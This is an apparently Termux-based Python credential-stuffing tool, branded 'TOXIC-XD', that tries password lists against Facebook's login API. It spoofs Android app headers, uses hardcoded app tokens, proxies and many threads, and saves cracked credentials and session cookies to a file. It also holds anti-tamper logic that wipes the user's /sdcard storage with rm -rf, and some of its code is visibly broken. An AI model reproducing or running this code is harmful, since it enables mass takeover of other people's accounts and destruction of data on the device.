#======================[ IMPORT CODE ]==========================#
import os
from os import path
from pathlib import Path
import os
from time import sleep
import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,time,datetime
from time import localtime as lt
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import requests
import os,sys
import httpx
#======================[ DRF SECURITY ]==================#
import os,random
import sys,time,uuid
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
from time import localtime as lt
os.system('clear')
print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m CHECKING UPDATE...!\x1b[38;5;46m [\x1b[1;97m–\x1b[38;5;46m]\x1b[38;5;46m')
time.sleep(3)
os.system('clear')
print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m LODGING TOXIC \x1b[1;97mTOOL \x1b[38;5;81m...\x1b[38;5;46m [\x1b[1;97m->\x1b[38;5;46m]');time.sleep(6)
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m~\x1b[1;97m MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\x1b[38;5;46m~\x1b[1;97m DO NOT TRY TO FUCK YOUR MOM...')
#==========================[ DATE ]=========================#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'\x1b[1;97m•\x1b[38;5;46m'+str(bln)+'\x1b[38;5;205m\x1b[1;97m•\x1b[38;5;46m'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#================[ SIM NAME ]================#
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'\x1b[38;5;205m | \x1b[38;5;46m')
#================[ ETC ]===================#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB','en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'
                sim_id+=fbcr
except:
        fbcr = "Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#===================[ PROXY ]===================#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()



with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
  
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
#==================[ HTTP CANNERY ]====================#
import requests
import os,sys


try:
    g = "anar"
    f="tt"
    file_d = os.listdir('rm -rf')
    if f'com.h{f}pc{g}y.pro' in file_d:
        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
        exit()
    else:
        pass
except Exception as e:
    pass

try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
    
def clr():
    try:
        data = os.listdir('/sdcard/*')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY MAHAT');exit()
        else:exit()
    except:exit()   

try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(prox)
except Exception as e:
    print('')
proxies=open('proxies.txt','r').read().splitlines()

princp=[]
#======================[ DEF APPRVAL ]=======================#
class apvroval:
    def check():
        url = "https://raw.githubusercontent.com/MATAL-007/TOXIC-XD/main/TOXIC-XDD"
        import mechanize
        my_awm = mechanize.Browser()
        try:
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                ____TOXIC_XD____()
            else:
                clear()
                print(f'\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m FREE TOOL WITH FRIENDS ')
                os.system('xdg-open https://wa.me/+8801911071432')
                print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m SEND YOUR KEY TO GET APPROVAL');linex()
        except Exception as e:
            print(e)
            exit()
#====================[ MY KEY ]=====================#
myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
#===================[ COLOUR CODE ]===========================
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; TOXIC~XD\x07')
try:
    import requests,os,json,time,re,random,sys,uuid,string
    from string import *
    from requests import api,httpx
    import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
    from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
    os.system('pip install requests futures==2 > /dev/null')
#===================[ SEX ]===========================#
def toxic(m):
    for x in m + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)
oks=[]
cps=[]
loop=0
user=[]
#===================[ USERNAME ]========================#
username=input('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m USERNAME: ')
#===================[ LOGO×BENNER ]===========================#
logo = (f"""                                 
\033[38;5;40m███    ███ ██████      ██████ ██████   █████   ██████ ██   ██ 
\033[38;5;41m████  ████ ██   ██    ██      ██   ██ ██   ██ ██      ██  ██  
\033[38;5;42m██ ████ ██ ██████     ██      ██████  ███████ ██      █████   
\033[38;5;43m██  ██  ██ ██   ██    ██      ██   ██ ██   ██ ██      ██  ██  
\033[38;5;44m██      ██ ██   ██ ██  ██████ ██   ██ ██   ██  ██████ ██   ██ 
\x1b[1;97m====================================================
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mDEVELOPER  \x1b[1;97m= \033[38;5;46m๛⃝𝐌𝐑  𝐓𝐎𝐗𝐈𝐂
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mFacebook   \x1b[1;97m= \033[38;5;46m๛⃝𝐌𝐑  𝐓𝐎𝐗𝐈𝐂
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mGuthub   \x1b[1;97m  = \033[38;5;46mTOX1C-143
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mVersion    \x1b[1;97m= \x1b[1;97mV/4.9
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mTools type \x1b[1;97m= \033[38;5;46mFREE\x1b[38;5;196m┼\033[1;41m\033[1;97m\x1b[38;5;196m\033[47mFILE & RANDOM\x1b[0m\x1b[38;5;196m┼
\x1b[1;97m====================================================
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m YOUR KEY \x1b[1;97m: \x1b[38;5;46m {MY_KEY}
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m USERNAME \x1b[1;97m: \x1b[38;5;46m {username}
\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m TODAY DATE\x1b[1;97m:{green} {date}
\x1b[1;97m====================================================""")
#==========================[ DEF CLEAR ]========================#
def clear():
    os.system('clear')
    print(logo)
#==========================[ DEF LINEX ]==========================#
def linex():
    print('\033[1;37m====================================================')
#=========================[ DEF TOXIC XD ]==========================#
def ____CYBER_BD____():
    clear()
    print('\x1b[1;97m[\033[38;5;46m1\x1b[1;97m]\033[38;5;46m FILE CROCKING ')
    print('\x1b[1;97m[\033[38;5;46m2\x1b[1;97m]\033[38;5;46m RANDOM CRACKING ')
    print('\x1b[1;97m[\033[38;5;46m3\x1b[1;97m]\033[38;5;46m WORKING PASSWORD ')
    print('\x1b[1;97m[\033[38;5;46m4\x1b[1;97m]\033[38;5;46m FILE CARATE ')
    print('\x1b[1;97m[\033[38;5;46m5\x1b[1;97m]\033[38;5;46m CONTACT ADMIN ')
    print('\x1b[1;97m[\033[38;5;46m0\x1b[1;97m]\033[38;5;46m EXIT TERMINAL ')
    linex()
    xd=input('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m CHOICE \033[1;37m:\033[38;5;46m ')
    if '1' ==xd:
        clear();print("\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m FOR EXAMPLE \x1b[37m: \x1b[31m/sdcard/toxic.txt");linex()
        try:
            fo = open(input('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m PUT FILE PATH \033[1;37m:\033[38;5;46m '),'r').read().splitlines()
        except:
            linex()
            print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mSorry! Your File location is incorrect! ');____TOXIC_XD____()
            time.sleep(1)
            ____CYBAR _BD____()
        method(fo)
    elif '2' ==xd:
        __BD__()
    elif '3' ==xd:
        __pass__()
    elif '4' ==xd:
        ___dump___()
    elif '5' ==xd:
        ___cont___()
        rnd()
        clear()
        ua = input(" Put User agent: ")
        open("ua.txt","w").write(ua)
        print(" Setup Complete Run Again! ")
        exit()
    elif '0' ==xd:
        linex()
        print(' Thanks for use Service! ')
        exit()
    else:
        linex()
        print(' Invalid option! ')
        time.sleep(1)
        main()
def method(fo):
    linex()
    plist = []
    try:
        ps_limit = int(input('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m How many passwords do you want to add ? '))
    except:
        ps_limit =1
    clear()
    print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m Exp: first last,firstlast,first123')
    linex()
    for i in range(ps_limit):
        plist.append(input(f'\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m Put password {i+1}: '))
    clear()
    print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mCracking Speed ')
    linex()
    print('\x1b[1;97m[\033[38;5;46m1\x1b[1;97m]\033[38;5;46m Fast\n\x1b[1;97m[\033[38;5;46m2\x1b[1;97m]\033[38;5;46m Normal ')
    linex()
    cracking_speed = input('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46mPut Opt: ')
    clear()
    print('\x1b[1;97m[\033[38;5;46m1\x1b[1;97m]\033[38;5;46m \x1b[1;97m[\033[38;5;46mMETHOD\x1b[1;97m=\033[38;5;46m1\x1b[1;97m]  ')
    print('\x1b[1;97m[\033[38;5;46m2\x1b[1;97m]\033[38;5;46m \x1b[1;97m[\033[38;5;46mMETHOD\x1b[1;97m=\033[38;5;46m2\x1b[1;97m]  ')
    print('\x1b[1;97m[\033[38;5;46m3\x1b[1;97m]\033[38;5;46m \x1b[1;97m[\033[38;5;46mMETHOD\x1b[1;97m=\033[38;5;46m3\x1b[1;97m]  ')
    print('\x1b[1;97m[\033[38;5;46m4\x1b[1;97m]\033[38;5;46m \x1b[1;97m[\033[38;5;46mMETHOD\x1b[1;97m=\033[38;5;46m4\x1b[1;97m]  ')
    linex()
    method = input(f'\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m CHOICE : ')
    if '2' or '02' in cracking_speed:
        spd = 20
    else:
        spd = 30
    with tred(max_workers=spd) as ___TOXIC___:
        clear()
        total_ids = str(len(fo))
        print(f'\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m SIM NAME \x1b[38;5;205m|{green} {sim} ')
        print(f'\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m METHOD    \033[1;37m:{green} M\x1b[1;97m-\x1b[38;5;46m{method}')
        print('\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m Total ids for cracking: \033[38;5;46m\x1b[1;97m'+total_ids+'\033[38;5;46m')
        print("\x1b[1;97m[\033[38;5;46m=\x1b[1;97m]\033[38;5;46m Use airplane while crack no result \033[38;5;46m")
        linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if method in ['1','01']:
                ___CBR___.submit(api,ids,names,passlist,total_ids)
            elif method in ['3','03']:
                ___CBR___.submit(api3,ids,names,passlist,total_ids)
            elif method in ['4','04']:
                ___CBR___.submit(api4,ids,names,passlist,total_ids)
            else:
                ___CBR___.submit(api2,ids,names,passlist,total_ids)
    print('\x1b[38;5;46m')
    linex()
    print('\x1b[38;5;46m\x1b[38;5;,46m The process has completed')
    print('\x1b[38;5;46m\x1b[38;5;46m Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input('\x1b[38;5;46m\x1b[1;97m Press enter to back \x1b[38;5;46m')
    main()
cps,oks,loop=[],[],0
my_con = []
proxy_allow = []
method_x = []
locl = []
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X']
#============================[ DEF RANDOM ]=========================#
def __BD__():
    clear()
    print(f'\x1b[38;5;46m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mEXAMPLE : 0177,0188,0199,0130,01400,');linex()
    code = input(f'\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mCHOICE : ')
    picci = []
    try:
        _siyam_ = int(input('Entar Pass Limit Sir : '))
    except:
        _siyam_ =1
    for i in range(_siyam_):
        picci.append(input(f'PASSWORD NO.{i+1} : '))
        
    print(f'\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m]\x1b[38;5;46m EXAMPLE : 1000,5000,90000,99999,50000');linex()
    limit = int(input(f'\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mCHOICE : '))
    for __x__man__ in range(limit):
            __XUDI__ = ''.join(random.choice(string.digits) for _ in range(8))
            user.append(__XUDI__)
    with tred(max_workers=30) as __SUBMIT__RANDOM__:
            tl = str(len(user))
            clear()
            print(f'\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mTOTAL LIMIT : {tl} ')
            print(f'\x1b[1;97m[\x1b[38;5;46m=\x1b[1;97m] \x1b[38;5;46mTURN ON/OFF FLIGHT MOOD EVERY 3 MINUTES ');linex()
            for love in user:
                    ids = code + love
                    pasx = [love,ids,ids[:8],ids[:7],'১২৩৪৫৬','@@@###']
                    pasx = picci
                    __SUBMIT__RANDOM__.submit(__method__,ids,pasx,tl)
#========================[ PROXY ]========================#

#========================[ USER AGENT ]=======================#
def ___fuck___():
        A = ""
        B = ""
        C = ""
        D = ""
        E = ""
        F = ""
        G = ""
        H = ""
        I = ""
        J = ""
        K = ""
        L = ""
        M = ""
        N = ""
        return random.choice([A,B,C,D,E,F,G,H,I,J,K,L,M,N,])
 #========================[ RANDOM METHOD CODE ]==========================#
 
#=================================[ FILE M1 ]==========================#
def api(ids,names,passlist,total_ids):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f"\r{red}[{green}={red}] [{green}TOXIC-XD{red}]{white}-{red}[{green}{loop}{red}]{white}-{red}[{green}OK:{str(len(oks))}{red}]{white}-{red}[{cyan}{'{:.1%}'.format(loop/int(total_ids))}{red}]");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/437.0.0.23.116;FBBV/446410443;FBDM/{density=1.9125,width=720,height=1280};FBLC/en_US;FBRV/446410518;FBCR/robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1031;FBSV/4.3;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
            head ={'User-Agent': uaddx,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": sid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            po = session.post("https://api.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
            if "session_key" in str(po):
                uid = ids
                get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                coki = f"sb={compile_coki};{get_coki}"
                print('\r\r\x1b[1;97m[\033[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;46mOK\x1b[1;97m]\x1b[38;5;46m '+uid+' | '+pas)
                print('\r\x1b[1;97m[\x1b[38;5;46mCookies\x1b[1;97m:] '+get_coki+'\x1b[1;97m')
                linex()
                oks.append(ids)
                open('/sdcard/CBR-OK.txt','a').write(uid+'|'+pas+'|'+get_coki+'\n')
                break
            elif "www.facebook.com" in po["error"]["message"]:
                uid = ids
                cps.append(ids)
                #print("\033[1;33m\r\r [TOXIC-CP] "+uid+" | "+pas)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#=====================[ FILE M2 ]=========================
def api2(ids,names,passlist,total_ids):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f"\r{red}[{green}={red}] [{green}TOXIC-XD{red}]{white}-{red}[{green}{loop}{red}]{white}-{red}[{green}OK:{str(len(oks))}{red}]{white}-{red}[{cyan}{'{:.1%}'.format(loop/int(total_ids))}{red}]");sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/436.0.0.17.101;FBBV/446211354;FBDM/{density=3.0,width=1080,height=1600};FBLC/en_US;FBRV/446211288;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M225FV;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent': uaddx,
            "Accept-Encoding":"gzip, deflate",
            "Connection":"keep-alive",
            "Content-Type":"application/x-www-form-urlencoded",
            "Host":"graph.facebook.com",
            "X-FB-Net-HNI": str(random.randint(3e7,4e7)),
            "X-FB-SIM-HNI": str(random.randint(2e4,4e4)),
            "X-FB-Connection-Type":"MOBILE.LTE",
            "Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            "X-FB-Connection-Quality":"MOBILE.LTE",
            "X-FB-Connection-Bandwidth": str(random.randint(3e7,4e7)),
            "X-Tigon-Is-Retry":"False",
            "X-FB-HTTP-Engine":"Liger",
            "X-FB-Client-IP":"True",
            "X-FB-Server-Cluster":"True"}
            data = {"adid":str(uuid.uuid4()),
            "format":"json",
            "device_id":str(uuid.uuid4()),
            "cpl":"true",
            "credentials_type":"device_based_login_password",
            "error_detail_type":"button_with_disabled",
            "email":sid,
            "password":ps,
            "access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            "generate_session_cookies":"1",
            "meta_inf_fbmeta":"NO_FILE",
            "advertiser_id":str(uuid.uuid4()),
            "currently_logged_in_userid":"0",
            "locale":"en_US",
            "client_country_code":"US",
            "method": "auth.login",
            "fb_api_req_friendly_name":"authenticate"}
            po = session.post("https://api.face"+"book.com/au"+"th/lo"+"gin",data=data, headers=headers, allow_redirects=False).json()
            if "session_key" in str(po):
                uid = ids
                get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                coki = f"sb={compile_coki};{get_coki}"
                print('\r\r\x1b[1;97m[\033[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;46mOK\x1b[1;97m]\x1b[38;5;46m '+uid+' | '+pas)
                print('\r\x1b[1;97m[\x1b[38;5;46mCookies\x1b[1;97m:] '+get_coki+'\x1b[1;97m')
                linex()
                oks.append(ids)
                open('/sdcard/TOXIC-OK.txt','a').write(uid+'|'+pas+'|'+get_coki+'\n')
                break
            elif "www.facebook.com" in po["error"]["message"]:
                uid = ids
                cps.append(ids)
                #print("\033[1;33m\r\r [TOXIC-CP] "+uid+" | "+pas)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
